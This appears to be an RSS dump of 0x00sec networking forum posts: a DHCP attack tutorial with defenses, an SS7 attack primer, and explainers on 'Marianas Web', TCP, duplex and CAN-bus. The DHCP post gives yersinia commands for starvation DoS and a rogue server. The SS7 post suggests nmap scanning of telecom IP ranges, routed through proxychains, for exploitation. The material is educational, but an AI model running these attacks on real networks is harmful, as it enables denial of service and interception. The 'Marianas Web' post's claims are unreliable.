<p>• Which of the Popular Secret Networks are Real?</p>
<p>• Lies, Legends and Misunderstandings on the Internet.</p>
<p>• What’s in Hidden Networks?</p>
<hr>
<p><strong>1- How Does Marianas Web Work? Technically What Is Its Logic? How To Build A Structure In This Way?</strong></p>
<p>The structure called MarianasWeb is actually just a simple LocalHost. External connections from outside cannot gain access. Only local connections can access. However, if we turn an external connection into a local connection, external connections can also provide access. I will explain how we can establish such a connection, now you will understand it much better.</p>
<p>First you need to buy a VPS server. You can do it on your own computer, but it would be better to use a VPS server to keep it open all the time.</p>
<p>You need to install an Apache LocalHost. Your link will be “<a href="http://localhost" rel="noopener nofollow ugc">http://localhost</a>” when you first install it. But we can change that. We can do whatever we want. For example, we can name it with a link like “.rdos”. It does not matter. For this, you can learn how to change it by doing a search on the internet like “How to make your own Apache LocalHost link”. So since the connection is local, we don’t have to set up a DNS server and change the domain extension.</p>
<p>In this way, we created a server. Let’s assume that our LocalHost connection is “<a href="http://3vn2odzn.l0xy" rel="noopener nofollow ugc">http://3vn2odzn.l0xy</a>”. For now, only we can access it. Nobody else can access their browser by typing this. So it’s time to give people a secret access.</p>
<p>For this we need to connect a person we want to give access to our server. We can do this with a VPN or a Node. I don’t know how to do it with node, because I haven’t found a correct result on the internet. That’s why I will describe it as a VPN. We have to turn our server into a VPN. You can find out how it’s done by doing a search on the Internet like “How to make / build your own VPN”.</p>
<p>After turning our server into a VPN, all we have to do is; Sharing the link file or link address with the person we want to give access to. The person we give access in this way will be able to access our site by typing “<a href="https://3vn2odzn.l0xy" rel="noopener nofollow ugc">https://3vn2odzn.l0xy</a>” in the internet browser. If you have software knowledge, you can take privacy to a higher level by creating a private and encrypted access program.</p>
<p><strong>2- How to Access MarianasWeb?</strong></p>
<p>As I mentioned in the previous topic, it is impossible to gain access unless the server owner gives you any access configuration. Also, assuming you have access, you do not have access to all the links on the link you received. Because anyone can put the link address they want. And there may be the same addresses set up on different servers.</p>
<p><strong>3- Which of the Popular Secret Networks are Real?</strong></p>
<p>As I mentioned in the first title; anyone can make the connection they want. For this reason, it is not possible to specify a link address and say that this address is real or this address is incorrect.</p>
<p><strong>4- Lies, Legends and Misunderstandings on the Internet.</strong></p>
<p>Everything that is not fully proved is theoretically wrong. Make sure that the only correct piece of information on the Internet is the article you are reading right now <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p><strong>5- What’s in Hidden Networks?</strong></p>
<p>This question is “what’s on the internet?” is like saying. So I will give a general answer. I have only been in one network so far. There were old documents and some articles. No need to take it seriously. However, research that needs to be done confidentially can also be distributed through such networks. So if you really want to see great things, you need to access a solid private network.</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/what-is-marianas-web-how-does-it-work-how-to-access-the-most-accurate-expression/24875">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/what-is-marianas-web-how-does-it-work-how-to-access-the-most-accurate-expression/24875</link>
          <pubDate>Wed, 10 Feb 2021 14:00:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24875</guid>
          <source url="https://0x00sec.org/t/what-is-marianas-web-how-does-it-work-how-to-access-the-most-accurate-expression/24875.rss">&gt; What is &quot;Marianas Web&quot;? / How does it work? / How to Access? / The Most Accurate Expression</source>
        </item>
        <item>
          <title>How to attack DHCP</title>
          <dc:creator><![CDATA[ezekiel]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hey everyone !</p>
<p>Low-level network attacks are quite missing here, so i’ll try to share one or two <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Here I’d like to talk about DHCP attacks ! And also how to mitigates them (on Cisco stuff). As always, those are just for educational purposes.</p>
<p>Please do not hesitate to correct me if i’m wrong somewhere ! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h2>The DHCP protocol</h2>
<p><strong>Dynamic Host Configuration Protocol</strong> allow computers to automatically receive IP addresses and network configuration from a DHCP server.</p>
<p>Here is a typical IP address obtention :</p>
<pre><code class="lang-auto">DHCP Client                   DHCP Server
    +
    +------------------------------&gt;
             DHCP Discover
                                   +
    &lt;------------------------------+
             DHCP Offer
    +
    +------------------------------&gt;
             DHCP Request
                                   +
    &lt;------------------------------+
       DHCP Ack (or Decline, Nack)
    +
    +------------------------------&gt;
             DHCP Release

</code></pre>
<p>We can see 7 different kinds of frames :</p>
<ul>
<li>DHCP Discover : this frame is broadcasted to all the network, in order to find the DHCP server.</li>
<li>DHCP Offer : the server responds to a DHCP discover in unicast. This frame contains network configuration (IP address pool, gateway address…).</li>
<li>DHCP Request : the client sends a broadcast frame to announce from which server he want to use the configuration from.</li>
<li>DHCP Ack : the chosen DHCP server assigns the IP and configuration parameters and acknowledges.</li>
<li>DHCP Nack : the DHCP server rejects the client’s request.</li>
<li>DHCP Decline : the client rejects the offered IP address.</li>
<li>DHCP Release : the client sends back his assigned IP address beafore the lease expires.</li>
</ul>
<p>Note that the response from the server (the DHCP Offer frame) contains not only the client IP, but other importants parameters as netmask, default gateway, and DNS.</p>
<p>For more informations about DHCP, check the <a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol" rel="noopener nofollow ugc">Wikipedia page</a>.</p>
<h2>DHCP starvation attack</h2>
<p>This first attack consists of exhausting the DHCP server’s IP addresses pool with a huge number of requests.</p>
<p>The attacker sends many DHCP requests with differents MAC addresses, which result in using all the available IP addresses. All the new machines that will try to connect to the network will not have any IP.</p>
<p>Then, the attacker can configure his working machine to be the new DHCP server to serve the new machines.</p>
<p>In a DHCP lease, informations about the default gateway and DNS are transmitted. The attacker can propose a lease to newcomers saying that he is the default gateway, which allow Man In The Middle attacks : every packets sent by hosts will go through the attacker machine.</p>
<p>There is a famous framework for level 2 attacks called <code>yersinia</code> that allow us to launch DHCP starvation attacks :</p>
<pre><code class="lang-auto"># yersinia dhcp -attack 1 -interface eth0
</code></pre>
<p>After specifying the protocol with the DHCP argument, we indicate the attack mode. <code>-attack 1</code> corresponds to ‘DoS attack sending discover packets’. The flag <code>-interface</code> allow us to specify which interface to use during the attack.</p>
<p>To stop the attack, just kill the process :</p>
<pre><code class="lang-auto"># killall yersinia
</code></pre>
<h2>DHCP rogue server attack</h2>
<p>The goal of this attack is to introduce in the network a rogue DHCP server that will responds to clients requests.</p>
<p>In order to succeed, you have to respond faster to DHCP Discover requests than the initial DHCP server. This can be done by multiple ways :</p>
<ul>
<li>
<p>By lauching a DoS attack to the current DHCP server : this will result in a longer time to respond, which give you an advantage.</p>
</li>
<li>
<p>By re-implementing DHCP on the attacker machine : DHCP servers usually do other things (DNS, gateway…). Basically, they take more time to respond than a simple DHCP server. Moreover, they have to look into their cache to see if an IP address has already been attributed, etc… So by implementing a DHCP server that will directly respond to a DHCP Discovery request with a hard-coded IP address, it is possible to be faster.</p>
</li>
</ul>
<p>In reality, you have to be faster twice : to reply to the DHCP Discovery and to send the DHCP Ack to validate the offer.</p>
<p>As seen before, <code>yersinia</code> allows us to do this attack :</p>
<pre><code class="lang-auto"># yersinia dhcp -attack 2 -interface eth0
</code></pre>
<p>where <code>-attack 2</code> means ‘nonDoS attack creating DHCP rogue server’. This attack mode does not need to use DoS, as its implementation is probably faster than standard DHCP used in home/office routers.</p>
<h2>How to protect</h2>
<p>Being offensive is nice, but it’s interesting to see the <em>blue side</em> of the Force. I’ll talk about Cisco equipment features.</p>
<p>There is 2 principal ways to avoid those attacks on Cisco equipments : <strong>DHCP snooping</strong> and <strong>IP source guard</strong>.</p>
<ul>
<li>DHCP snooping allows to filter suspicious DHCP requests, and building what is called a ‘DHCP binding table’. This table contains the DHCP attributions, as MAC addresses, IP addresses, lease duration, VLAN number and corresponding interface.</li>
</ul>
<p>The sysadmin can specify on the switch trusted interfaces on which DHCP offers and DHCP {Ack,NAck} can be received. Those interfaces are designated as <strong>trusted</strong>, and others as <strong>untrusted</strong>.</p>
<p>Each interface that link a client to the switch must be set to untrusted, which only permit DHCP Discover/Request packets to enter; others are dropped.</p>
<p>Ports on which a DHCP server is connected must be set as trusted in order for the switch to accept DHCP Offers and DHCP {Ack,NAck} packets.</p>
<p>The DCHP binding table holds information about untrusted ports, and is fed by dynamic entries learnt via DHCP. On an important network, it is recommended to outsource this table : locally, it is stored in flash memory. For each new entry, its content have to be erased and wrote again. It can also generate heavy CPU loads, and is case of shutdown, all the tables are lost.</p>
<p>It is possible to configure automatic outsourcing as following :</p>
<pre><code class="lang-auto">(config)# ip dhcp snooping database ftp://192.168.42.69/binding-table.dhcp
(config)# ip dhcp snooping database write-delay 300
</code></pre>
<p>In the example we use FTP, but HTTP, RCP and TFTP are allowed too. <code>write-delay</code> is the duration between every copy when the table changes.</p>
<ul>
<li>IP source guard allow us to protect from IP usurpation obtained by DHCP. In this kind of attack, the attacker changes his IP and/or his MAC address in order to access a remote machine (IP spoofing) or to avoid ACL set by the sysadmin.</li>
</ul>
<p>IP source guard uses the DHCP binding table. At the beginning all the IP traffic is dropped, except DHCP packets. Once a client has received a valid IP from the server, a VLAN ACL is set on the corresponding port. All the traffic emitted with another IP∕MAC on this port will be dropped.</p>
<p>To configure IP source guard on a Cisco swicth, you can enter :</p>
<pre><code class="lang-auto">(config)# interface FastEthernet1/0/3   # or whatever interface you want
(config-if)# ip verify source port security
</code></pre>
<p>That’s it, I hope you enjoyed it ! <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-attack-dhcp/23763">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-attack-dhcp/23763</link>
          <pubDate>Tue, 03 Nov 2020 12:44:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-23763</guid>
          <source url="https://0x00sec.org/t/how-to-attack-dhcp/23763.rss">How to attack DHCP</source>
        </item>
        <item>
          <title>AS141011 registered</title>
          <dc:creator><![CDATA[zhihuiyuze]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>I recently registered an AS141011 and 2602:FEDA:AB0::/44<br>
ip address. I found that BGP is commonly used in Cisco and bird. Cisco has more tutorials but it is not free software that cannot be deployed on IX VPS. Bird only has documents and is not easy to learn. Does anyone want to maintain it together? Who will give me some BGP Tutorial?</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/as141011-registered/22842">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/as141011-registered/22842</link>
          <pubDate>Wed, 26 Aug 2020 02:14:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22842</guid>
          <source url="https://0x00sec.org/t/as141011-registered/22842.rss">AS141011 registered</source>
        </item>
        <item>
          <title>Getting know - TCP handshake and messages</title>
          <dc:creator><![CDATA[Xocho]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Lets get know to TCP 3 way handshake,  or TCP handshake three messages,<br>
as we know TCP is reliable and that protocol point is to deliver data successfully, and if problem occurs TCP must fix that.</p>
<p>so, for reliability, before TCP transmits data it will use three way handshake to estabilish a connection.</p>
<p><strong>SYN</strong>,  <strong>SYN-ACK</strong> , <strong>ACK</strong>  ,  they are messages (SYN = synchronize,ACK=acknowledge)</p>
<hr>
<p>explain - for  example we have <strong>Computer A</strong> and <strong>Computer B</strong></p>
<ol>
<li>
<p><strong>Computr A</strong> sending SYN segment to <strong>Comutr B</strong>, asking for synchronization<br>
synchronization means ‘hey computer B can you open connection for me?’</p>
</li>
<li>
<p>after that <strong>Computr B</strong> sends back SYN-ACK to <strong>Computer A</strong><br>
it acknowledges and also tells <strong>computr A</strong> to open connection too</p>
</li>
<li>
<p><strong>Computer A</strong> sends ACK, to <strong>computr B</strong><br>
it means OK, we agreed</p>
</li>
<li>
<p><em>Connection Estabilished</em></p>
</li>
</ol>
<p>.<br>
<img src="/uploads/default/original/2X/3/399576096ad46e600eab9270adfe9f322835e00c.png" alt="" data-base62-sha1="8dpqX0qtWlhDQA8MXnEs9MWdXM8" width="578" height="490"><br>
<img src="/uploads/default/original/2X/f/f2d1c8f3bb5ac14271908260b6cf485d42e8c439.gif" alt="" data-base62-sha1="yE50CIqNEPOzFrzxdrjFNfHRIQ9" width="366" height="226"></p>
<p>FTP,SMTP,HTTP,HTTPS,Telnet,POP3,SSH and any other protocol that works over TCP also has a three way handshake performed as connection is opened.</p>
<p>maybe will ad some more details later</p>
            <p><small>8 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/getting-know-tcp-handshake-and-messages/20115">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/getting-know-tcp-handshake-and-messages/20115</link>
          <pubDate>Sat, 28 Mar 2020 23:33:33 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20115</guid>
          <source url="https://0x00sec.org/t/getting-know-tcp-handshake-and-messages/20115.rss">Getting know - TCP handshake and messages</source>
        </item>
        <item>
          <title>Full-duplex and Half-duplex</title>
          <dc:creator><![CDATA[Xocho]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>In network communication we may have heard about <strong>duplex</strong>,<strong>simplex</strong>,<strong>half-duplex</strong>,<strong>full-duplex</strong> so i’m gonna talk about that things</p>
<ul>
<li>term duplex means how <strong>networking devices</strong> can communicate to each other, (how devices can transmit data and receive)</li>
</ul>
<p><img src="/uploads/default/original/2X/5/552322cebe4e9497bc8278ec0bc167d7a1796d8b.jpeg" alt="" data-base62-sha1="c99Rx6spWY1fEfCLsgdD1uQMoTp" width="593" height="443"></p>
<ul>
<li><strong>Full Duplex</strong></li>
</ul>
<p>In full duplex transmission mode, the communication between sender and receiver can occur simultaneously.  The sender and receiver can both transmit data and receive at the same time</p>
<p>Telephones are full-duplex systems so both parties on the phone can talk and listen at the same time</p>
<ul>
<li><strong>Half Duplex</strong></li>
</ul>
<p>in Half Duplex both side can communicate but not at the same time, for example if computer A sending data to Computer B, then computer B have to wait until receive data to start sending back.</p>
<p>Walkie-talkie radio communication is a <strong>half-duplex</strong> system<br>
<img src="/uploads/default/original/2X/d/d77014926e31fd7edef67141765c0fc46d4406a4.jpeg" alt="" data-base62-sha1="uJQMO1WrWHTusVsxXUMvvkmbAX2" width="640" height="316"></p>
<p><strong>HUB</strong> is also <strong>Half-Duplex</strong> because hub sends data to <strong>broadcast</strong><br>
For example, if Computer A sending data, data must go to every network devices, and if data transfering moment, Computer B decides to send data, it’s going to happen <strong>Collision</strong> ,<br>
Collision is when in Half-duplex communication two side decides to transfer data at same time, in that moment data will be lost, and devices have to send it again (in a row)<br>
.<br>
<img src="/uploads/default/original/2X/5/508595e829ba79aa85959ce5afd14cb1411f79cf.gif" alt="" data-base62-sha1="bukp0HmNyHTe2gddhvm9kiKSS6j" width="320" height="240"><br>
.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/15511cd93554321321f856a606b31646abce314d.jpeg" data-download-href="/uploads/short-url/32zOdHdDfeDrPOfx7ykQDMMYi0B.jpeg?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/15511cd93554321321f856a606b31646abce314d_2_472x500.jpeg" alt="" data-base62-sha1="32zOdHdDfeDrPOfx7ykQDMMYi0B" width="472" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/15511cd93554321321f856a606b31646abce314d_2_472x500.jpeg, /uploads/default/original/2X/1/15511cd93554321321f856a606b31646abce314d.jpeg 1.5x, /uploads/default/original/2X/1/15511cd93554321321f856a606b31646abce314d.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/15511cd93554321321f856a606b31646abce314d_2_10x10.png"></a></div><p></p>
<p>.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7.jpeg" data-download-href="/uploads/short-url/tzc3fRewiHEhO2t4erFlVd4NHhl.jpeg?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7_2_522x500.jpeg" alt="" data-base62-sha1="tzc3fRewiHEhO2t4erFlVd4NHhl" width="522" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7_2_522x500.jpeg, /uploads/default/original/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7.jpeg 1.5x, /uploads/default/original/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/cf3982bdf1f62d262ac73c7fac4075b631477cb7_2_10x10.png"></a></div><p></p>
<ul>
<li><strong>Simplex</strong></li>
</ul>
<p>In simplex transmission mode, the communication between sender and receiver occurs in only one direction.  The sender can only send the data, and the receiver can only receive the data.  The receiver cannot reply to the sender.</p>
<p>Simplex transmission can be thought of as a one-way road in which the traffic travels only in one direction—no vehicle coming from the opposite direction is allowed to drive through.</p>
<p>To take a keyboard / monitor relationship as an example, the keyboard can only send the input to the monitor, and the monitor can only receive the input and display it on the screen.  The monitor cannot reply, or send any feedback, to the keyboard.</p>
<p><img src="/uploads/default/original/2X/c/cbe61c002b266ed49c5308501bcf81321e420bd0.png" alt="" data-base62-sha1="t5LVSDBtdlHkK4NC8MZwnXP1EUo" width="350" height="82"></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/full-duplex-and-half-duplex/19982">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/full-duplex-and-half-duplex/19982</link>
          <pubDate>Sun, 22 Mar 2020 15:51:24 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19982</guid>
          <source url="https://0x00sec.org/t/full-duplex-and-half-duplex/19982.rss">Full-duplex and Half-duplex</source>
        </item>
        <item>
          <title>SS7 network part 1</title>
          <dc:creator><![CDATA[arminsali]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>So based on my researches i wanna share with you guys what i’ve got so far about SS7</p>
<p>1.you can find out a lot of documents about the possible ways to attack SS7 network  and download it for free (<a href="https://www.slideshare.net/search/slideshow?searchfrom=header&amp;q=ss7" rel="nofollow noopener">https://www.slideshare.net/search/slideshow?searchfrom=header&amp;q=ss7</a>)</p>
<p>2.there’s variety of documents but none of them pointed out about how exactly we can do it.<br>
3.also there are tons of Ethical hacking courses but again I couldn’t find any course about SS7 over the internet</p>
<p>alright so let’s talk about SS7 network itself<br>
well i was thinking that i know anything about network and its functionality<br>
and i thought there’s only one network and that is computer network!!<br>
but after reading about SS7 network and PSTN and LTE and other networks out there that our daily basis conversation relies on, I realised there is a lot of other so called hidden networks exist  that nobody wants we know or talk about them because of the security reasons…</p>
<p>so i’m gonna cut to the point:<br>
SS7 has many acronym stuff which Even if you aren’t an acronym fan, you’ll have to memorize them so then when you saw for example<br>
HLR/HSS you know what the heck they’re talking about.</p>
<p>HERE is some of acronyms  with the description  of what they’re doing:</p>
<p>STP (Signal Transfer Point)<br>
The “knots” that hold the network together. These nodes serve to provide network access to other<br>
nodes (by connection with Access Links). STPs transfer messages around the network. STPs<br>
maintain routing tables for the purposes of directing messages to their intended destinations.</p>
<p>SSP (Service Switching Point)<br>
The Service Switching Point is a switch associated node which handles call set-up and has the<br>
ability to stop call processing, make queries of even unknown databases, and perform actions<br>
appropriate to the response. In general, the SS7 messages which originate or terminate here are<br>
either circuit or call routing related.</p>
<p>SCP (Service Control Point)<br>
In general, Service Control Points provide access to databases. These nodes are the residences of<br>
processes which can access the database, extract the required data and return it to the node<br>
requesting the data. The database(s) to which the SCP has access may or may not reside at the<br>
same location as the SCP. The same capabilities that allow the SCP to access databases lend themselves to other uses such as providing access to an IP.</p>
<p>IP (Intelligent Peripheral)<br>
The IP is the residence of processes which manage resources such as signalling sensors and voice<br>
response equipment. The resource management capabilities become available to switches on<br>
demand, thereby freeing switch locations from the need to equip with a myriad of such devices,<br>
and providing highly efficient use of both aging and up-to-date technologies.</p>
<p>CRP (Customer Routing Point)<br>
The CRP provides on-premises control of the routing information requested by switches for translation of 800 type dialing (not limited to 800 numbers). The operator of the CRP is a customer<br>
who requires rapid update and control of the translation of their own numbers.</p>
<p>MSC (Mobile Switching Center)<br>
The Mobile Switching Center maintains control over its own Transceiver network. Part of this<br>
control includes tracking subscribers and performing “hand offs.” The MSC also provides the<br>
landline connections into the PSTN to complete the connection of subscriber calls. Finally, the<br>
MSC makes use of the SS7 network to convey circuit related information to the PSTN and to<br>
communicate with the service providers of “roamers.”</p>
<p>HLR/VLR (Home Location Register/Visitor Location Register)<br>
A database that contains customer information about local subscribers is maintained by each provider. This is the Home Location Register. Another company will access this information when a<br>
“roamer” appears, and use the data for an entry into its Visitor Location Register</p>
<p>==BUT gentleman, this desctiptions aren’t helpful that much<br>
we need to see the steps with the explanation about how exactly we can perform ss7 network attack  and i promise you guys there are many ways to do that…</p>
<p>lets look at some ss7 network nodes and how they look like:</p>
<p>HLR/HSS<br>
<span alt="HLR.HSS" data-base62-sha1="8QqiEeso0MRS7ryfG2quUhGvOaA" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Signaling Converter SS7, ISDN PRI, CAS<span alt="Signaling Converter SS7, ISDN PRI, CAS" data-base62-sha1="oUYRjLfV6LjPzIsMvzSVQwzWEZC" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>STP<br>
<span alt="STP" data-base62-sha1="Acn9wdnv5IUBRbQO6YNBVLypKo7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>these are some of ss7 nodes , so obviously they are running some sort of OS (operation system)</p>
<p>so now i hope after reading some documents about ss7 network you won’t get surprised when you see this picture<br>
<span alt="ss7-network-web-ss7-analysis-and-simulation" data-base62-sha1="3byoIuSxk6bKdiXkq24Bj09uOAx" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>as you see in the above picture, we’ve some nodes that you should know at least what’s  their functionality in the network.</p>
<p>alright<br>
now it’s time to see the steps that we should take in order to perform a successful attack :</p>
<p>===first thing first, we have to get access to SS7 network,<br>
here is some entry points:<br>
but wait, what are ss7 entry points?<br>
how we can recognize entry points?</p>
<p>well here’s some of them</p>
<ul>
<li>STP connectivity</li>
<li>
<pre><code>SIGTRAN protocols
</code></pre>
</li>
<li>
<pre><code>VAS systems e.g. SMSC, IN
</code></pre>
</li>
<li>
<pre><code>Signaling Gateways, MGW
</code></pre>
</li>
<li>
<pre><code>SS7 Service providers (GRX, IPX)
</code></pre>
</li>
<li>
<pre><code>GTT translation
</code></pre>
</li>
<li>
<pre><code>ISDN terminals
</code></pre>
</li>
<li>
<pre><code>GSM phones
</code></pre>
</li>
<li>
<pre><code>LIG (Legal Interception Gateway)
</code></pre>
</li>
<li>
<pre><code>3G Femtocell
</code></pre>
</li>
<li>
<pre><code>SIP encapsulation
</code></pre>
</li>
</ul>
<p>how we get access to entry points ?<br>
you can do many things, you can find your find your telecommunications company ip range and do some nmap port scanning to finding some open ports and do some exploitation.<br>
proxychains nmap -A -p 21-1000 -Pn [ip]</p>
<p>===more to come for part 2</p>
<p>if you know anything about ss7 attack please let us know because this is far more interesting topic than boring computer network</p>
            <p><small>13 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/ss7-network-part-1/19671">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/ss7-network-part-1/19671</link>
          <pubDate>Fri, 06 Mar 2020 16:12:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19671</guid>
          <source url="https://0x00sec.org/t/ss7-network-part-1/19671.rss">SS7 network part 1</source>
        </item>
        <item>
          <title>CAN-bus protocol pentesting and forensics</title>
          <dc:creator><![CDATA[cjhackerz]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d284fcdd9107c0376be06138af8742cf6207a28.png" alt="" data-base62-sha1="b0z8eaoNby9L2StFZfLzEgF4jc4" width="559" height="200"></p>
<h2>Introduction</h2>
<p>CAN (Controller Area Network) is a vehicle bus protocol standard which allows microcontrollers and ECU (electronic control units) to communicate which each other without a host computer. It is a message-based protocol, designed originally for multiplex electrical wiring within automobiles to save on copper, but can also be used in many other contexts. But why CAN you may ask, because it’s low-cost error less since via single CAN interface ECU can communicate with each through the centralized system with less wiring involved and data is transferred over digital signal instead of analog so it reduces chances of error occurrence. Also, it’s a tolerant system against electromagnetic noise which makes it best fit for vehicle electronics system.</p>
<p>There is another protocol which works on top of CAN called OBD (On-board diagnostics). OBD adds up the transport layer for CAN.</p>
<p><img src="https://cjhackerz.net/img/canbusVobdVsosi.svg" alt="CAN vs. OBD vs. OSI layers" width="531" height="455"></p>
<p><em>CAN vs. OBD vs. OSI layers</em></p>
<p>For physical layer CAN have two major standards to transmit data over a physical medium (wires)</p>
<ul>
<li>High Speed CAN Signaling. ISO 11898-2 (frequent error occurrence)</li>
<li>Low-Speed Fault Tolerant CAN Network. ISO 11898-3 (less error occurrence)</li>
</ul>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088.png" data-download-href="/uploads/short-url/xxh17m60sRa0jR81LnoZTYhX7D2.png?dl=1" title="CAN node" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088_2_546x499.png" alt="CAN node" data-base62-sha1="xxh17m60sRa0jR81LnoZTYhX7D2" width="546" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088_2_546x499.png, https://0x00sec.s3.amazonaws.com/optimized/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088_2_819x748.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/eb0aa5cc76280e0b879ab0743d1b798b49bef088_2_10x10.png"></a></div><p></p>
<p><em>CAN node layout</em></p>
<p>I won’t provide more details of the standards above, because as IoT security researchers Data Link and Network layers are what we should be interested in. Let’s have look at standard CAN message frame format which gets transmitted over network.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b154e05b767a613fe0666ab627401ba808d4e447.png" alt="CAN message frame" data-base62-sha1="piKmgpAyc5tbLLQAoGj422VzT71" width="571" height="201"></p>
<ul>
<li>
<strong>SOF (Start of Frame):</strong>  Tells other ECUs that message is incoming</li>
<li>
<strong>CAN-ID:</strong>  Contains priority bits for message along with functional address of ECU (in terms of networking CAN-ID is like mac address, but not same thing)</li>
<li>
<strong>RTR:</strong>  Remote transmission requests allows ECU to request messages from other active ECUs on network</li>
<li>
<strong>CONTROL:</strong>  Informs length of the data in bytes</li>
<li>
<strong>DATA:</strong>  Contains data values to be transmitted over protocol</li>
<li>
<strong>CRC:</strong>  Cyclic Redudancy Values for error correction and data integrity</li>
<li>
<strong>ACK:</strong>  It indicates status of CRC process</li>
<li>
<strong>EOF</strong> : End of frame marks the end of CAN message frame</li>
</ul>
<p>Now for network packet forseics we only need to worry about  <strong>CAN-ID</strong> ,  <strong>CONTROL</strong>  and  <strong>DATA</strong></p>
